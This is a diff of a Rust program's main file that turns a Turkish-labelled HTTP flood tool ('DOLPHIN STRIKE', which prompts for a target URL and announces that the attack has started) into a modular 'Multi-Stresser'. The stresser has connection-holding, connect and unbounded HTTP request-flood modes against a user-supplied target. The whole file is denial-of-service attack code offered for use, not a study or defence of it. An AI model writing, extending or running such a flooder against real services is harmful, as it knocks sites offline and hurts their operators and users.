@@ -1,63 +1,129 @@
-use reqwest::Client;
+mod config;
+mod stats;
+mod worker;
+mod modes;
+
+use config::Config;
+use stats::Stats;
+
 use std::sync::Arc;
 use tokio::sync::Semaphore;
-use tokio::time::sleep;
-use std::io::{ self, Write };
-use std::time::Duration;
 
 #[tokio::main]
 async fn main() {
-    // Ekranı temizle (Clear Screen)
-    print!("\x1b[2J\x1b[1;1H");
 
-    // Matrix Yeşili Başlık
-    println!("\x1b[32m");
-    pub fn print_banner() {
-        println!(
-            "\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2880}\u{28c0}\u{28c0}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2880}\u{28f4}\u{28ff}\u{28ff}\u{28ff}\u{28ff}\u{28f7}\u{28e6}\u{2840}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2880}\u{28f4}\u{28ff}\u{28ff}\u{281f}\u{280b}\u{2809}\u{2819}\u{283b}\u{28bf}\u{28ff}\u{28e6}\u{2840}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28a0}\u{28ff}\u{287f}\u{280b}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2808}\u{28bb}\u{28ff}\u{2844}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28a0}\u{28ff}\u{280f}\u{2800}\u{2800}\u{2800}\u{2880}\u{28c0}\u{28c0}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28bb}\u{28e7}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28fe}\u{285f}\u{2800}\u{2800}\u{28f4}\u{28ff}\u{28ff}\u{28ff}\u{28ff}\u{28ff}\u{28e6}\u{2840}\u{2800}\u{2800}\u{2818}\u{28ff}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28ff}\u{28c7}\u{2800}\u{2800}\u{2818}\u{283f}\u{283f}\u{283f}\u{283f}\u{283f}\u{281f}\u{2801}\u{2800}\u{2800}\u{2880}\u{28ff}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2818}\u{28bf}\u{28e6}\u{28c4}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2880}\u{28e0}\u{28f4}\u{287f}\u{2803}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2808}\u{2819}\u{283b}\u{283f}\u{2836}\u{2836}\u{2836}\u{283f}\u{283f}\u{281f}\u{280b}\u{2801}\n\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2880}\u{28c0}\u{28e4}\u{28e4}\u{28c0}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2880}\u{28f4}\u{28ff}\u{287f}\u{281f}\u{281b}\u{283b}\u{28bf}\u{28ff}\u{28e6}\u{2840}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28e0}\u{28ff}\u{281f}\u{2801}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2808}\u{283b}\u{28e7}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28f4}\u{28ff}\u{2803}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28bb}\u{28e7}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{28b8}\u{28ff}\u{2847}\u{2800}\u{2800}\u{2880}\u{28e4}\u{28e4}\u{28c0}\u{2800}\u{2800}\u{2800}\u{2800}\u{28b8}\u{28ff}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2818}\u{28ff}\u{28e7}\u{2800}\u{2810}\u{283f}\u{283f}\u{283f}\u{281f}\u{2800}\u{2800}\u{2800}\u{28e0}\u{28ff}\u{280f}\n\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2800}\u{2808}\u{283b}\u{28bf}\u{28f6}\u{28e4}\u{28e4}\u{28e4}\u{28e4}\u{28f6}\u{287f}\u{281f}\u{280b}\u{2801}\n\n\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}  \u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557} \u{2588}\u{2588}\u{2557}     \u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557} \u{2588}\u{2588}\u{2557}  \u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2588}\u{2557}   \u{2588}\u{2588}\u{2557}\n\u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2550}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2551}     \u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2551}  \u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}  \u{2588}\u{2588}\u{2551}\n\u{2588}\u{2588}\u{2551}  \u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}   \u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}     \u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2554}\u{255d}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2554}\u{2588}\u{2588}\u{2557} \u{2588}\u{2588}\u{2551}\n\u{2588}\u{2588}\u{2551}  \u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}   \u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}     \u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2550}\u{255d} \u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}\u{255a}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2551}\n\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2554}\u{255d}\u{255a}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2554}\u{255d}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2551}     \u{2588}\u{2588}\u{2551}  \u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551} \u{255a}\u{2588}\u{2588}\u{2588}\u{2588}\u{2551}\n\u{255a}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d}  \u{255a}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d} \u{255a}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d}\u{255a}\u{2550}\u{255d}     \u{255a}\u{2550}\u{255d}  \u{255a}\u{2550}\u{255d}\u{255a}\u{2550}\u{255d}\u{255a}\u{2550}\u{255d}  \u{255a}\u{2550}\u{2550}\u{2550}\u{255d}\n\n\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557} \u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2557}  \u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}\n\u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d}\u{255a}\u{2550}\u{2550}\u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{255d}\u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551} \u{2588}\u{2588}\u{2554}\u{255d}\u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d}\n\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}   \u{2588}\u{2588}\u{2551}   \u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2554}\u{255d}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2554}\u{255d} \u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}\n\u{255a}\u{2550}\u{2550}\u{2550}\u{2550}\u{2588}\u{2588}\u{2551}   \u{2588}\u{2588}\u{2551}   \u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2554}\u{2550}\u{2588}\u{2588}\u{2557} \u{2588}\u{2588}\u{2554}\u{2550}\u{2550}\u{255d}\n\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2551}   \u{2588}\u{2588}\u{2551}   \u{2588}\u{2588}\u{2551}  \u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}\u{2588}\u{2588}\u{2551}  \u{2588}\u{2588}\u{2557}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2557}\n\u{255a}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d}   \u{255a}\u{2550}\u{255d}   \u{255a}\u{2550}\u{255d}  \u{255a}\u{2550}\u{255d}\u{255a}\u{2550}\u{255d}\u{255a}\u{2550}\u{255d}  \u{255a}\u{2550}\u{255d}\u{255a}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d}\n\n>> [ SYSTEM STATUS: ACTIVE ]\n>> [ MODULE: DOLPHIN_STRIKE ]\n"
-        );
+    // Load config
+    let config = Config::from_args();
+
+    println!("==============================");
+    println!("Multi-Stresser Started");
+    println!("Target      : {}", config.target);
+    println!("Connections : {}", config.connections);
+    println!("Concurrency : {}", config.concurrency);
+    println!("Hold mode   : {}", config.hold);
+    println!("Infinite    : {}", config.infinite);
+    println!("HTTP mode   : {}", config.http);
+    println!("==============================");
+
+    // Semaphore for concurrency control
+    let semaphore = Arc::new(Semaphore::new(config.concurrency));
+
+    // Stats
+    let stats = Stats::new();
+
+    // Start live stats printer
+    Stats::start_printer(stats.clone());
+
+    // Mode selection
+    if config.http {
+
+        run_http_mode(
+            config.target,
+            config.connections,
+            semaphore,
+            stats,
+            config.infinite,
+        ).await;
+
+    }
+    else if config.hold {
+
+        modes::hold::run(
+            config.target,
+            config.connections,
+            semaphore,
+            stats,
+            config.infinite,
+        ).await;
+
+    }
+    else {
+
+        modes::connect::run(
+            config.target,
+            config.connections,
+            semaphore,
+            stats,
+        ).await;
+
     }
 
-    println!("\x1b[0m");
-
-    print!("\x1b[32m[#] HEDEF URL: \x1b[0m");
-    io::stdout().flush().unwrap();
-
-    let mut target = String::new();
-    io::stdin().read_line(&mut target).unwrap();
-    let target = target.trim().to_string();
-
-    println!("\n\x1b[32m[!] Saldırı başlatıldı. Durdurmak için CTRL+C\x1b[0m\n");
-
-    attack_loop(target).await;
 }
 
-async fn attack_loop(target: String) {
-    let client = Client::new();
-    let semaphore = Arc::new(Semaphore::new(500));
+async fn run_http_mode(
+    target: String,
+    connections: usize,
+    semaphore: Arc<Semaphore>,
+    stats: Arc<Stats>,
+    infinite: bool,
+) {
 
-    loop {
-        let permit = semaphore.clone().acquire_owned().await.unwrap();
-        let c = client.clone();
-        let t = target.clone();
-        tokio::time::sleep(Duration::from_micros(200)).await;
+    if infinite {
 
-        tokio::spawn(async move {
-            let res = c.get(t).send().await;
-            match res {
-                Ok(_) => {
-                    // Başarılı istek: Parlak Yeşil '>>'
-                    print!("\x1b[92m>>\x1b[0m");
-                }
-                Err(_) => {
-                    // Hata/Sunucu Çökmesi: Kırmızı '!!'
-                    print!("\x1b[31m!!\x1b[0m");
-                }
-            }
-            let _ = io::stdout().flush();
-            drop(permit);
-        });
+        loop {
 
-        tokio::time::sleep(Duration::from_millis(1)).await;
+            let permit = semaphore.clone().acquire_owned().await.unwrap();
+
+            let target = target.clone();
+            let stats = stats.clone();
+
+            tokio::spawn(async move {
+
+                modes::request::send_http_request(target, stats).await;
+
+                drop(permit);
+
+            });
+
+        }
+
+    } else {
+
+        let mut handles = Vec::new();
+
+        for _ in 0..connections {
+
+            let permit = semaphore.clone().acquire_owned().await.unwrap();
+
+            let target = target.clone();
+            let stats = stats.clone();
+
+            let handle = tokio::spawn(async move {
+
+                modes::request::send_http_request(target, stats).await;
+
+                drop(permit);
+
+            });
+
+            handles.push(handle);
+
+        }
+
+        for h in handles {
+            let _ = h.await;
+        }
+
     }
+
 }
